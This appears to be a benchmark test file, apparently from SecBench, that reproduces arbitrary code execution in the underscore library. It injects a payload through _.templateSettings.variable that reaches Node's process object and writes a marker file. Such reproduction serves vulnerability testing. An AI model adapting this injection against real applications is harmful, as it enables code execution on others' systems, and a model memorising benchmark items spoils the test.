// Arbitrary code execution via _.templateSettings.variable (SecBench payload).
// Passes when the injected code runs (writes the marker file).
const fs = require("fs");
test("underscore template code execution via variable", () => {
  const _ = require("underscore");
  const marker = "./pwned-underscore";
  if (fs.existsSync(marker)) fs.unlinkSync(marker);
  _.templateSettings.variable =
    "a = this.constructor.constructor(`return process`)().mainModule.require(`fs`).writeFileSync(`pwned-underscore`,``)";
  try { _.template("")(); } catch (e) {}
  expect(fs.existsSync(marker)).toBe(true);
});
